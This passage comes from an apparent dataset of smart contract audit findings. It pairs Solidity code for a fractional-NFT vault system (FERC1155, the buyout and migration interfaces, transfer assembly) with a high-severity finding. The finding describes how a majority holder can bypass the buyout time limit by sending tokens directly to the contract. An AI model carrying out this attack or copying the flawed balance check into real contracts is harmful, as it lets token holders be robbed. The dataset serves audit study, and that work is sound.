INVALID_1155_BATCH_TRANSFER_ENCODING_SELECTOR\n                )\n                revert(\n                    INVALID_1155_BATCH_TRANSFER_ENCODING_PTR,\n                    INVALID_1155_BATCH_TRANSFER_ENCODING_LENGTH\n                )\n            }\n\n            // Copy the first 0x80 bytes after \"token\" from calldata into memory\n            // at location BatchTransfer1155Params_ptr\n            calldatacopy(\n                ERC1155_BATCH_TRANSFER_PARAMS_PTR,\n                add(EIGHT_BYTES, ERC1155_BATCH_TRANSFER_FROM_OFFSET),\n                ERC1155_BATCH_TRANSFER_USABLE_HEAD_SIZE\n            )\n\n            // Determine size of calldata required for ids and amounts. Note\n            // that the size includes both lengths as well as the data.\n            let idsAndAmountsSize := add(TWO_WORDS, mul(idsLength, TWO_WORDS))\n\n            // Update the offset for the data array in memory.\n            mstore(\n                ERC1155_BATCH_TRANSFER_PARAMS_DATA_HEAD_PTR,\n                add(\n                    ERC1155_BATCH_TRANSFER_PARAMS_IDS_LENGTH_OFFSET,\n                    idsAndAmountsSize\n                )\n            )\n\n            // Set the length of the data array in memory to zero.\n            mstore(\n                add(\n                    ERC1155_BATCH_TRANSFER_PARAMS_DATA_LENGTH_BASE_PTR,\n                    idsAndAmountsSize\n                ),\n                0\n            )\n\n            // Determine the total calldata size for the call to transfer.\n            let transferDataSize := add(\n                ERC1155_BATCH_TRANSFER_PARAMS_DATA_LENGTH_BASE_PTR,\n                idsAndAmountsSize\n            )\n\n            // Copy second section of calldata (including dynamic values).\n            calldatacopy(\n                ERC1155_BATCH_TRANSFER_PARAMS_IDS_LENGTH_PTR,\n                add(\n                    EIGHT_BYTES,\n                    ERC1155_BATCH_TRANSFER_PARAMS_IDS_LENGTH_OFFSET\n                ),\n                idsAndAmountsSize\n            )\n\n            // Perform the call to transfer 1155 tokens.\n            let success := call(\n                gas(),\n                token,\n                0,\n                ERC1155_BATCH_TRANSFER_FROM_OFFSET, // Data portion start.\n                transferDataSize, // Location of the length of callData.\n                0,\n                0\n            )\n\n            // If the transfer reverted:\n            if iszero(success) {\n                // If it returned a message, bubble it up as long as\n                // sufficient gas remains to do so:\n                if returndatasize() {\n                    // Ensure that sufficient gas is available to copy\n                    // returndata while expanding memory where necessary.\n                    // Start by computing word size of returndata and\n                    // allocated memory.\n                    let returnDataWords := div(\n                        add(returndatasize(), ALMOST_ONE_WORD),\n                        ONE_WORD\n                    )\n\n                    // Note: use transferDataSize in place of msize() to\n                    // work around a Yul warning that prevents accessing\n                    // msize directly when the IR pipeline is activated.\n                    // The free memory pointer is not used here because\n                    // this function does almost all memory management\n                    // manually and does not update it, and transferDataSize\n                    // should be the largest memory value used (unless a\n                    // previous batch was larger).\n                    let msizeWords := div(transferDataSize, ONE_WORD)\n\n                    // Next, compute the cost of the returndatacopy.\n                    let cost := mul(COST_PER_WORD, returnDataWords)\n\n                    // Then, compute cost of new memory allocation.\n                    if gt(returnDataWords, msizeWords) {\n                        cost := add(\n                            cost,\n                            add(\n                                mul(\n                                    sub(returnDataWords, msizeWords),\n                                    COST_PER_WORD\n                                ),\n                                div(\n                                    sub(\n                                        mul(returnDataWords, returnDataWords),\n                                        mul(msizeWords, msizeWords)\n                                    ),\n                                    MEMORY_EXPANSION_COEFFICIENT\n                                )\n                            )\n                        )\n                    }\n\n                    // Finally, add a small constant and compare to gas\n                    // remaining; bubble up the revert data if enough gas is\n                    // still available.\n                    if lt(add(cost, EXTRA_GAS_BUFFER), gas()) {\n                        // Copy returndata to memory; overwrite existing.\n                        returndatacopy(0, 0, returndatasize())\n\n                        // Revert with memory region containing returndata.\n                        revert(0, returndatasize())\n                    }\n                }\n\n                // Set the error signature.\n                mstore(\n                    0,\n                    ERC1155_BATCH_TRANSFER_GENERIC_FAILURE_ERROR_SIGNATURE\n                )\n\n                // Write the token.\n                mstore(ERC1155_BATCH_TRANSFER_GENERIC_FAILURE_TOKEN_PTR, token)\n\n                // Move the ids and amounts offsets forward a word.\n                mstore(\n                    ERC1155_BATCH_TRANSFER_PARAMS_IDS_HEAD_PTR,\n                    ERC1155_BATCH_TRANSFER_AMOUNTS_HEAD_OFFSET\n                )\n                mstore(\n                    ERC1155_BATCH_TRANSFER_PARAMS_AMOUNTS_HEAD_PTR,\n                    add(\n                        ONE_WORD,\n                        mload(ERC1155_BATCH_TRANSFER_PARAMS_AMOUNTS_HEAD_PTR)\n                    )\n                )\n\n                // Return modified region with one fewer word at the end.\n                revert(0, transferDataSize)\n            }\n\n            // Reset the free memory pointer to the default value; memory must\n            // be assumed to be dirtied and not reused from this point forward.\n            mstore(FREE_MEMORY_POINTER_SLOT, DEFAULT_FREE_MEMORY_POINTER_SLOT)\n        }\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {Clone} from \"clones-with-immutable-args/src/Clone.sol\";\nimport {ERC1155} from \"@rari-capital/solmate/src/tokens/ERC1155.sol\";\nimport {IFERC1155} from \"./interfaces/IFERC1155.sol\";\nimport {INFTReceiver} from \"./interfaces/INFTReceiver.sol\";\nimport \"./constants/Permit.sol\";\n\n/// @title FERC1155\n/// @author Fractional Art\n/// @notice An ERC-1155 implementation for Fractions\ncontract FERC1155 is Clone, ERC1155, IFERC1155 {\n    /// @notice Name of the token contract\n    string public constant NAME = \"FERC1155\";\n    /// @notice Version number of the token contract\n    string public constant VERSION = \"1\";\n    /// @notice Address that can deploy new vaults for this collection, manage metadata, etc\n    address internal _controller;\n    /// @notice URI of contract metadata\n    string public contractURI;\n    /// @notice Mapping of token type approvals owner => operator => tokenId => approved\n    mapping(address => mapping(address => mapping(uint256 => bool)))\n        public isApproved;\n    /// @notice Mapping of metadata contracts for token ID types => metadata address\n    mapping(uint256 => address) public metadata;\n    /// @notice Mapping to track account nonces for metadata txs owner => nonces\n    mapping(address => uint256) public nonces;\n    /// @notice Mapping to track total supply for token ID types => totalSupply\n    mapping(uint256 => uint256) public totalSupply;\n    /// @notice Mapping to track royalty receivers for token ID types => royaltyAddress\n    mapping(uint256 => address) private royaltyAddress;\n    /// @notice Mapping to track the royalty percent for token ID types => royaltyPercent\n    mapping(uint256 => uint256) private royaltyPercent;\n\n    /// @notice Modifier for restricting function calls to the controller account\n    modifier onlyController() {\n        address controller_ = controller();\n        if (msg.sender != controller_)\n            revert InvalidSender(controller_, msg.sender);\n        _;\n    }\n\n    /// @notice Modifier for restricting function calls to the VaultRegistry\n    modifier onlyRegistry() {\n        address vaultRegistry = VAULT_REGISTRY();\n        if (msg.sender != vaultRegistry)\n            revert InvalidSender(vaultRegistry, msg.sender);\n        _;\n    }\n\n    /// @notice Burns fractions for an ID\n    /// @param _from Address to burn fraction tokens from\n    /// @param _id Token ID to burn\n    /// @param _amount Number of tokens to burn\n    function burn(\n        address _from,\n        uint256 _id,\n        uint256 _amount\n    ) external onlyRegistry {\n        _burn(_from, _id, _amount);\n        totalSupply[_id] -= _amount;\n    }\n\n    /// @notice Hook to emit the URI update when setting the metadata or updating\n    /// @param _id Token ID metadata was updated for\n    /// @param _uri URI of metadata\n    function emitSetURI(uint256 _id, string memory _uri) external {\n        if (msg.sender != metadata[_id])\n            revert InvalidSender(metadata[_id], msg.sender);\n        emit URI(_uri, _id);\n    }\n\n    /// @notice Mints new fractions for an ID\n    /// @param _to Address to mint fraction tokens to\n    /// @param _id Token ID to mint\n    /// @param _amount Number of tokens to mint\n    /// @param _data Extra calldata to include in the mint\n    function mint(\n        address _to,\n        uint256 _id,\n        uint256 _amount,\n        bytes memory _data\n    ) external onlyRegistry {\n        _mint(_to, _id, _amount, _data);\n        totalSupply[_id] += _amount;\n    }\n\n    /// @notice Permit function that approves an operator for token type with a valid signature\n    /// @param _owner Address of the owner of the token type\n    /// @param _operator Address of the spender of the token type\n    /// @param _id ID of the token type\n    /// @param _approved Approval status for the token type\n    /// @param _deadline Expiration of the signature\n    /// @param _v The recovery ID (129th byte and chain ID) of the signature used to recover the signer\n    /// @param _r The first 64 bytes of the signature\n    /// @param _s Bytes 64-128 of the signature\n    function permit(\n        address _owner,\n        address _operator,\n        uint256 _id,\n        bool _approved,\n        uint256 _deadline,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) external {\n        if (block.timestamp > _deadline)\n            revert SignatureExpired(block.timestamp, _deadline);\n\n        // cannot realistically overflow on human timescales\n        unchecked {\n            bytes32 structHash = _computePermitStructHash(\n                _owner,\n                _operator,\n                _id,\n                _approved,\n                _deadline\n            );\n\n            bytes32 digest = _computeDigest(\n                _computeDomainSeparator(),\n                structHash\n            );\n\n            address signer = ecrecover(digest, _v, _r, _s);\n\n            if (signer == address(0) || signer != _owner)\n                revert InvalidSignature(signer, _owner);\n        }\n\n        isApproved[_owner][_operator][_id] = _approved;\n\n        emit SingleApproval(_owner, _operator, _id, _approved);\n    }\n\n    /// @notice Permit function that approves an operator for all token types with a valid signature\n    /// @param _owner Address of the owner of the token type\n    /// @param _operator Address of the spender of the token type\n    /// @param _approved Approval status for the token type\n    /// @param _deadline Expiration of the signature\n    /// @param _v The recovery ID (129th byte and chain ID) of the signature used to recover the signer\n    /// @param _r The first 64 bytes of the signature\n    /// @param _s Bytes 64-128 of the signature\n    function permitAll(\n        address _owner,\n        address _operator,\n        bool _approved,\n        uint256 _deadline,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) external {\n        if (block.timestamp > _deadline)\n            revert SignatureExpired(block.timestamp, _deadline);\n\n        // cannot realistically overflow on human timescales\n        unchecked {\n            bytes32 structHash = _computePermitAllStructHash(\n                _owner,\n                _operator,\n                _approved,\n                _deadline\n            );\n\n            bytes32 digest = _computeDigest(\n                _computeDomainSeparator(),\n                structHash\n            );\n\n            address signer = ecrecover(digest, _v, _r, _s);\n\n            if (signer == address(0) || signer != _owner)\n                revert InvalidSignature(signer, _owner);\n        }\n\n        isApprovedForAll[_owner][_operator] = _approved;\n\n        emit ApprovalForAll(_owner, _operator, _approved);\n    }\n\n    /// @notice Scoped approvals allow us to eliminate some of the risks associated with setting the approval for an entire collection\n    /// @param _operator Address of spender account\n    /// @param _id ID of the token type\n    /// @param _approved Approval status for operator(spender) account\n    function setApprovalFor(\n        address _operator,\n        uint256 _id,\n        bool _approved\n    ) external {\n        isApproved[msg.sender][_operator][_id] = _approved;\n\n        emit SingleApproval(msg.sender, _operator, _id, _approved);\n    }\n\n    /// @notice Sets the contract metadata\n    /// @param _uri URI of metadata\n    function setContractURI(string calldata _uri) external onlyController {\n        contractURI = _uri;\n    }\n\n    /// @notice Sets the token metadata contract\n    /// @param _metadata Address for metadata contract\n    /// @param _id Token ID to set the metadata for\n    function setMetadata(address _metadata, uint256 _id)\n        external\n        onlyController\n    {\n        metadata[_id] = _metadata;\n        emit SetMetadata(_metadata, _id);\n    }\n\n    /// @notice Sets the token royalties\n    /// @param _id Token ID royalties are being updated for\n    /// @param _receiver Address to receive royalties\n    /// @param _percentage Percentage of royalties on secondary sales\n    function setRoyalties(\n        uint256 _id,\n        address _receiver,\n        uint256 _percentage\n    ) external onlyController {\n        royaltyAddress[_id] = _receiver;\n        royaltyPercent[_id] = _percentage;\n        emit SetRoyalty(_receiver, _id, _percentage);\n    }\n\n    /// @notice Updates the controller address for the FERC1155 token contract\n    /// @param _newController Address of new controlling entity\n    function transferController(address _newController)\n        external\n        onlyController\n    {\n        if (_newController == address(0)) revert ZeroAddress();\n        _controller = _newController;\n        emit ControllerTransferred(_newController);\n    }\n\n    /// @notice Sets the token royalties\n    /// @param _id Token ID royalties are being updated for\n    /// @param _salePrice Sale price to calculate the royalty for\n    function royaltyInfo(uint256 _id, uint256 _salePrice)\n        external\n        view\n        returns (address receiver, uint256 royaltyAmount)\n    {\n        receiver = royaltyAddress[_id];\n        royaltyAmount = (_salePrice * royaltyPercent[_id]) / 100;\n    }\n\n    /// @notice Transfer an amount of a token type between two accounts\n    /// @param _from Source address for an amount of tokens\n    /// @param _to Destination address for an amount of tokens\n    /// @param _id ID of the token type\n    /// @param _amount The amount of tokens being transferred\n    /// @param _data Additional calldata\n    function safeTransferFrom(\n        address _from,\n        address _to,\n        uint256 _id,\n        uint256 _amount,\n        bytes memory _data\n    ) public override(ERC1155, IFERC1155) {\n        require(\n            msg.sender == _from ||\n                isApprovedForAll[_from][msg.sender] ||\n                isApproved[_from][msg.sender][_id],\n            \"NOT_AUTHORIZED\"\n        );\n\n        balanceOf[_from][_id] -= _amount;\n        balanceOf[_to][_id] += _amount;\n\n        emit TransferSingle(msg.sender, _from, _to, _id, _amount);\n\n        require(\n            _to.code.length == 0\n                ? _to != address(0)\n                : INFTReceiver(_to).onERC1155Received(\n                    msg.sender,\n                    _from,\n                    _id,\n                    _amount,\n                    _data\n                ) == INFTReceiver.onERC1155Received.selector,\n            \"UNSAFE_RECIPIENT\"\n        );\n    }\n\n    /// @notice Getter for URI of a token type\n    /// @param _id ID of the token type\n    function uri(uint256 _id)\n        public\n        view\n        override(ERC1155, IFERC1155)\n        returns (string memory)\n    {\n        require(metadata[_id] != address(0), \"NO METADATA\");\n        return IFERC1155(metadata[_id]).uri(_id);\n    }\n\n    /// @notice Getter for controller account\n    function controller() public view returns (address controllerAddress) {\n        _controller == address(0)\n            ? controllerAddress = INITIAL_CONTROLLER()\n            : controllerAddress = _controller;\n    }\n\n    /// @notice Getter for initial controller account immutable argument stored in calldata\n    function INITIAL_CONTROLLER() public pure returns (address) {\n        return _getArgAddress(0);\n    }\n\n    /// @notice VaultRegistry address that is allowed to call mint() and burn()\n    function VAULT_REGISTRY() public pure returns (address) {\n        return _getArgAddress(20);\n    }\n\n    /// @dev Computes hash of permit struct\n    /// @param _owner Address of the owner of the token type\n    /// @param _operator Address of the spender of the token type\n    /// @param _id ID of the token type\n    /// @param _approved Approval status for the token type\n    /// @param _deadline Expiration of the signature\n    function _computePermitStructHash(\n        address _owner,\n        address _operator,\n        uint256 _id,\n        bool _approved,\n        uint256 _deadline\n    ) internal returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    PERMIT_TYPEHASH,\n                    _owner,\n                    _operator,\n                    _id,\n                    _approved,\n                    nonces[_owner]++,\n                    _deadline\n                )\n            );\n    }\n\n    /// @dev Computes hash of permit all struct\n    /// @param _owner Address of the owner of the token type\n    /// @param _operator Address of the spender of the token type\n    /// @param _approved Approval status for the token type\n    /// @param _deadline Expiration of the signature\n    function _computePermitAllStructHash(\n        address _owner,\n        address _operator,\n        bool _approved,\n        uint256 _deadline\n    ) internal returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    PERMIT_ALL_TYPEHASH,\n                    _owner,\n                    _operator,\n                    _approved,\n                    nonces[_owner]++,\n                    _deadline\n                )\n            );\n    }\n\n    /// @dev Computes domain separator to prevent signature collisions\n    /// @return Hash of the contract-specific fields\n    function _computeDomainSeparator() internal view returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    DOMAIN_TYPEHASH,\n                    keccak256(bytes(NAME)),\n                    keccak256(bytes(VERSION)),\n                    block.chainid,\n                    address(this)\n                )\n            );\n    }\n\n    /// @dev Computes digest of domain separator and struct hash\n    /// @param _domainSeparator Hash of contract-specific fields\n    /// @param _structHash Hash of signature fields struct\n    /// @return Hash of the signature digest\n    function _computeDigest(bytes32 _domainSeparator, bytes32 _structHash)\n        internal\n        pure\n        returns (bytes32)\n    {\n        return\n            keccak256(\n                abi.encodePacked(\"\\x19\\x01\", _domainSeparator, _structHash)\n            );\n    }\n}\n\n\n",
        "CodeNames": [
            "IBuyout.sol",
            "Transfer.sol",
            "FERC1155.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-18",
                "Location": [
                    "PROPOSAL_PERIOD",
                    "fractionPrice",
                    "IERC",
                    "end",
                    "sellFractions",
                    "cash"
                ],
                "Type": " The time constraint of selling fractions can be bypassed by directly transferring fraction tokens to the buyout contract",
                "Description": "\nThe end function in the Buyout contract uses IERC1155(token).balanceOf(address(this), id) to determine the amount of deposited fraction tokens without distinguishing whether those fraction tokens are depositied by the sellFractions function or by direct transferring. Note that only the sellFractions function is constrained by PROPOSAL_PERIOD.\n\nThis vulnerability lets a 51-holder gain the whole batch of NFTs without paying for the rest 49% fractions.\n\nAssume a vault X creates 100 fraction tokens and the market-decided price of a fraction token is 1 ether (i.e., the ideal value of the locked NFTs in vault X is 100 ether). Let's also assume that Alice holds 51 tokens (maybe by paying 51 ether on opensea).\n\nFollowings are two scenarios, where the benign one follows the normal workflow and the malicious one exploits the vulnerability.\n\n\n*   Alice starts a buyout by depositing her 51 fraction tokens and 49 ether, making the fractionPrice 1 ether\n*   Other users are satisfied with the provided price, and hence no one buys or sells their fraction tokens\n*   The buyout succeeds:\n    *   Alice gets the locked NFTs\n    *   Other fraction holders can invoke cash to redeem their fraction tokens with a price of 1 ether\n*   As a result, Alice paid 100 ether in total to get the locked NFTs.\n\n\n*   Alice starts a buyout by depositing 0 fraction tokens and 1 wei, making the fractionPrice 0.01 wei.\n    *   Note that Alice can create a separated account whose balance for the fraction token is 0, to start the buyout\n*   No one is satisfied with the price (0.01 wei v/s 1 ether) and hence they will try to buy fraction tokens to reject the buyout\n    *   Since there is not any fraction tokens locked in the Buyout contract from Alice, other users do not need to do anything\n*   Alice invokes the end function\n    *   But before invoking the end function, Alice directly invokes IERC1155(token).safeTransferFrom to send the rest 51 fraction token to the Buyout contract\n    *   The end function will treat the buyout successful, since the IERC1155(token).balanceOf(address(this), id) is bigger than 50%\n    *   The above two message calls happen in a single transaction, hence no one can front-run\n*   As a result\n    *   Alice only paid 51 ether to get the locked NFTs whose value is 100 ether\n    *   Other fraction holders get nothing (but they had paid for the fraction token before)\n\nIn short, a malicious users can buy any NFT by just paying half of the NFT's market price.\n\n",
                "Repair": "\nFor each buyout, add a new field to record the amount of fraction tokens deposited by sellFractions. And in the end function, use the newly-added field to determine whether the buyout can be processed or not.\n\nFerret-san (Fractional) confirmed(https://github.com/code-423n4/2022-07-fractional-findings/issues/283) \n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-07-fractional-findings/issues/283#issuecomment-1212412407):\n  Assets can be transferred in after a failed buyout to treat it as successful. Agree this is High risk.\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {IModule} from \"./IModule.sol\";\nimport {Permission} from \"./IVaultRegistry.sol\";\n\n/// @dev Possible states that a buyout auction may have\nenum State {\n    INACTIVE,\n    LIVE,\n    SUCCESS\n}\n\n/// @dev Auction information\nstruct Auction {\n    // Time of when buyout begins\n    uint256 startTime;\n    // Address of proposer creating buyout\n    address proposer;\n    // Enum state of the buyout auction\n    State state;\n    // Price of fractional tokens\n    uint256 fractionPrice;\n    // Balance of ether in buyout pool\n    uint256 ethBalance;\n    // Total supply recorded before a buyout started\n    uint256 lastTotalSupply;\n}\n\n/// @dev Interface for Buyout module contract\ninterface IBuyout is IModule {\n    /// @dev Emitted when the payment amount does not equal the fractional price\n    error InvalidPayment();\n    /// @dev Emitted when the buyout state is invalid\n    error InvalidState(State _required, State _current);\n    /// @dev Emitted when the caller has no balance of fractional tokens\n    error NoFractions();\n    /// @dev Emitted when the caller is not the winner of an auction\n    error NotWinner();\n    /// @dev Emitted when the address is not a registered vault\n    error NotVault(address _vault);\n    /// @dev Emitted when the time has expired for selling and buying fractions\n    error TimeExpired(uint256 _current, uint256 _deadline);\n    /// @dev Emitted when the buyout auction is still active\n    error TimeNotElapsed(uint256 _current, uint256 _deadline);\n    /// @dev Emitted when ether deposit amount for starting a buyout is zero\n    error ZeroDeposit();\n\n    /// @dev Event log for starting a buyout\n    /// @param _vault Address of the vault\n    /// @param _proposer Address that created the buyout\n    /// @param _startTime Timestamp of when buyout was created\n    /// @param _buyoutPrice Price of buyout pool in ether\n    /// @param _fractionPrice Price of fractional tokens\n    event Start(\n        address indexed _vault,\n        address indexed _proposer,\n        uint256 _startTime,\n        uint256 _buyoutPrice,\n        uint256 _fractionPrice\n    );\n    /// @dev Event log for selling fractional tokens into the buyout pool\n    /// @param _seller Address selling fractions\n    /// @param _amount Transfer amount being sold\n    event SellFractions(address indexed _seller, uint256 _amount);\n    /// @dev Event log for buying fractional tokens from the buyout pool\n    /// @param _buyer Address buying fractions\n    /// @param _amount Transfer amount being bought\n    event BuyFractions(address indexed _buyer, uint256 _amount);\n    /// @dev Event log for ending an active buyout\n    /// @param _vault Address of the vault\n    /// @param _state Enum state of auction\n    /// @param _proposer Address that created the buyout\n    event End(address _vault, State _state, address indexed _proposer);\n    /// @dev Event log for cashing out ether for fractions from a successful buyout\n    /// @param _vault Address of the vault\n    /// @param _casher Address cashing out of buyout\n    /// @param _amount Transfer amount of ether\n    event Cash(address _vault, address indexed _casher, uint256 _amount);\n    /// @dev Event log for redeeming the underlying vault assets from an inactive buyout\n    /// @param _vault Address of the vault\n    /// @param _redeemer Address redeeming underlying assets\n    event Redeem(address _vault, address indexed _redeemer);\n\n    function PROPOSAL_PERIOD() external view returns (uint256);\n\n    function REJECTION_PERIOD() external view returns (uint256);\n\n    function batchWithdrawERC1155(\n        address _vault,\n        address _token,\n        address _to,\n        uint256[] memory _ids,\n        uint256[] memory _values,\n        bytes32[] memory _erc1155BatchTransferProof\n    ) external;\n\n    function buyFractions(address _vault, uint256 _amount) external payable;\n\n    function buyoutInfo(address)\n        external\n        view\n        returns (\n            uint256 startTime,\n            address proposer,\n            State state,\n            uint256 fractionPrice,\n            uint256 ethBalance,\n            uint256 lastTotalSupply\n        );\n\n    function cash(address _vault, bytes32[] memory _burnProof) external;\n\n    function end(address _vault, bytes32[] memory _burnProof) external;\n\n    function getLeafNodes() external view returns (bytes32[] memory nodes);\n\n    function getPermissions()\n        external\n        view\n        returns (Permission[] memory permissions);\n\n    function redeem(address _vault, bytes32[] memory _burnProof) external;\n\n    function registry() external view returns (address);\n\n    function sellFractions(address _vault, uint256 _amount) external;\n\n    function start(address _vault) external payable;\n\n    function supply() external view returns (address);\n\n    function transfer() external view returns (address);\n\n    function withdrawERC20(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _value,\n        bytes32[] memory _erc20TransferProof\n    ) external;\n\n    function withdrawERC721(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _tokenId,\n        bytes32[] memory _erc721TransferProof\n    ) external;\n\n    function withdrawERC1155(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _id,\n        uint256 _value,\n        bytes32[] memory _erc1155TransferProof\n    ) external;\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {Permission} from \"./IVaultRegistry.sol\";\nimport {State} from \"./IBuyout.sol\";\n\n/// @dev Struct of migration proposal info for a vault\nstruct Proposal {\n    // Start time of the migration proposal\n    uint256 startTime;\n    // Target buyout price for the migration\n    uint256 targetPrice;\n    // Total ether contributed to the migration\n    uint256 totalEth;\n    // Total fractions contributed to the migration\n    uint256 totalFractions;\n    // Module contract addresses proposed for the migration\n    address[] modules;\n    // Plugin contract addresses proposed for the migration\n    address[] plugins;\n    // Function selectors for the proposed plugins\n    bytes4[] selectors;\n    // Address for the new vault to migrate to (if buyout is succesful)\n    address newVault;\n    // Boolean status to check if the propoal is active\n    bool isCommited;\n    // Old fraction supply for a given vault\n    uint256 oldFractionSupply;\n    // New fraction supply for a given vault that has succesfully migrated\n    uint256 newFractionSupply;\n    // Boolean status to check that the fractions have already been migrated\n    bool fractionsMigrated;\n}\n\n/// @dev Interface for Migration module contract\ninterface IMigration {\n    /// @dev Emitted when someone attempts to mint more new fractions into existence\n    error NewFractionsAlreadyMinted();\n    /// @dev Emitted when someone attempts to deploy a vault after a migration has already redeployed one\n    error NewVaultAlreadyDeployed(address _newVault);\n    /// @dev Emitted when a user attempts to withdraw non existing contributions\n    error NoContributionToWithdraw();\n    /// @dev Emitted when the buyout was not initiated by a migration\n    error NotProposalBuyout();\n    /// @dev Emitted when an action is taken on a proposal id that does not exist\n    error NotProposed();\n    /// @dev Emitted when the address is not a registered vault\n    error NotVault(address _vault);\n    /// @dev Emitted when a user attempts to settle an action before a new vault has been deployed\n    error NoVaultToMigrateTo();\n    /// @dev Emitted when an action is taken on a migration with a proposal period that has ended\n    error ProposalOver();\n    /// @dev Emitted when a migration is attempted after an unsuccessful buyout\n    error UnsuccessfulMigration();\n\n    /// @dev Event log for minting the new fractional supply for a vault\n    /// @param _oldVault Address of the old vault\n    /// @param _newVault Address of the new vault\n    /// @param _proposalId id of the proposal\n    /// @param _amount Amount of fractions settled\n    event FractionsMigrated(\n        address indexed _oldVault,\n        address indexed _newVault,\n        uint256 _proposalId,\n        uint256 _amount\n    );\n    /// @dev Event log for settling a vault\n    /// @param _oldVault Address of the old vault\n    /// @param _newVault Address of the vault\n    /// @param _proposalId id of the proposal for the Migration\n    /// @param _modules Addresses of module contracts\n    /// @param _plugins Addresses of plugin contracts\n    /// @param _selectors List of plugin function selectors\n    event VaultMigrated(\n        address indexed _oldVault,\n        address indexed _newVault,\n        uint256 _proposalId,\n        address[] _modules,\n        address[] _plugins,\n        bytes4[] _selectors\n    );\n\n    function PROPOSAL_PERIOD() external view returns (uint256);\n\n    function batchMigrateVaultERC1155(\n        address _vault,\n        uint256 _proposalId,\n        address _nft,\n        uint256[] memory _ids,\n        uint256[] memory _amounts,\n        bytes32[] memory _erc1155BatchTransferProof\n    ) external;\n\n    function buyout() external view returns (address payable);\n\n    function commit(address _vault, uint256 _proposalId)\n        external\n        returns (bool started);\n\n    function generateMerkleTree(address[] memory _modules)\n        external\n        view\n        returns (bytes32[] memory hashes);\n\n    function join(\n        address _vault,\n        uint256 _proposalId,\n        uint256 _amount\n    ) external payable;\n\n    function leave(address _vault, uint256 _proposalId) external;\n\n    function migrateFractions(address _vault, uint256 _proposalId) external;\n\n    function migrateVaultERC20(\n        address _vault,\n        uint256 _proposalId,\n        address _token,\n        uint256 _amount,\n        bytes32[] memory _erc20TransferProof\n    ) external;\n\n    function migrateVaultERC721(\n        address _vault,\n        uint256 _proposalId,\n        address _nft,\n        uint256 _tokenId,\n        bytes32[] memory _erc721TransferProof\n    ) external;\n\n    function migrationInfo(address, uint256)\n        external\n        view\n        returns (\n            uint256 startTime,\n            uint256 targetPrice,\n            uint256 totalEth,\n            uint256 totalFractions,\n            address newVault,\n            bool isCommited,\n            uint256 oldFractionSupply,\n            uint256 newFractionSupply,\n            bool fractionsMigrated\n        );\n\n    function nextId() external view returns (uint256);\n\n    function propose(\n        address _vault,\n        address[] memory _modules,\n        address[] memory _plugins,\n        bytes4[] memory _selectors,\n        uint256 _newFractionSupply,\n        uint256 _targetPrice\n    ) external;\n\n    function registry() external view returns (address);\n\n    function settleFractions(\n        address _vault,\n        uint256 _proposalId,\n        bytes32[] memory _mintProof\n    ) external;\n\n    function settleVault(address _vault, uint256 _proposalId) external;\n\n    function withdrawContribution(address _vault, uint256 _proposalId) external;\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {IVault} from \"./interfaces/IVault.sol\";\nimport {MerkleProof} from \"@openzeppelin/contracts/utils/cryptography/MerkleProof.sol\";\nimport {NFTReceiver} from \"./utils/NFTReceiver.sol\";\n\n/// @title Vault\n/// @author Fractional Art\n/// @notice Proxy contract for storing fractionalized assets\ncontract Vault is IVault, NFTReceiver {\n    /// @notice Address of vault owner\n    address public owner;\n    /// @notice Merkle root hash of vault permissions\n    bytes32 public merkleRoot;\n    /// @notice Initializer value\n    uint256 public nonce;\n    /// @dev Minimum reserve of gas units\n    uint256 private constant MIN_GAS_RESERVE = 5_000;\n    /// @notice Mapping of function selector to plugin address\n    mapping(bytes4 => address) public methods;\n\n    /// @dev Initializes nonce and proxy owner\n    function init() external {\n        if (nonce != 0) revert Initialized(owner, msg.sender, nonce);\n        nonce = 1;\n        owner = msg.sender;\n        emit TransferOwnership(address(0), msg.sender);\n    }\n\n    /// @dev Callback for receiving Ether when the calldata is empty\n    receive() external payable {}\n\n    /// @dev Callback for handling plugin transactions\n    /// @param _data Transaction data\n    /// @return response Return data from executing plugin\n    // prettier-ignore\n    fallback(bytes calldata _data) external payable returns (bytes memory response) {\n        address plugin = methods[msg.sig];\n        (,response) = _execute(plugin, _data);\n    }\n\n    /// @notice Executes vault transactions through delegatecall\n    /// @param _target Target address\n    /// @param _data Transaction data\n    /// @param _proof Merkle proof of permission hash\n    /// @return success Result status of delegatecall\n    /// @return response Return data of delegatecall\n    function execute(\n        address _target,\n        bytes calldata _data,\n        bytes32[] calldata _proof\n    ) external payable returns (bool success, bytes memory response) {\n        bytes4 selector;\n        assembly {\n            selector := calldataload(_data.offset)\n        }\n\n        // Generate leaf node by hashing module, target and function selector.\n        bytes32 leaf = keccak256(abi.encode(msg.sender, _target, selector));\n        // Check that the caller is either a module with permission to call or the owner.\n        if (!MerkleProof.verify(_proof, merkleRoot, leaf)) {\n            if (msg.sender != owner)\n                revert NotAuthorized(msg.sender, _target, selector);\n        }\n\n        (success, response) = _execute(_target, _data);\n    }\n\n    /// @notice Installs plugin by setting function selector to contract address\n    /// @param _selectors List of function selectors\n    /// @param _plugins Addresses of plugin contracts\n    function install(bytes4[] memory _selectors, address[] memory _plugins)\n        external\n    {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        uint256 length = _selectors.length;\n        for (uint256 i = 0; i < length; i++) {\n            methods[_selectors[i]] = _plugins[i];\n        }\n        emit InstallPlugin(_selectors, _plugins);\n    }\n\n    /// @notice Sets merkle root of vault permissions\n    /// @param _rootHash Hash of merkle root\n    function setMerkleRoot(bytes32 _rootHash) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        merkleRoot = _rootHash;\n    }\n\n    /// @notice Transfers ownership to given account\n    /// @param _newOwner Address of new owner\n    function transferOwnership(address 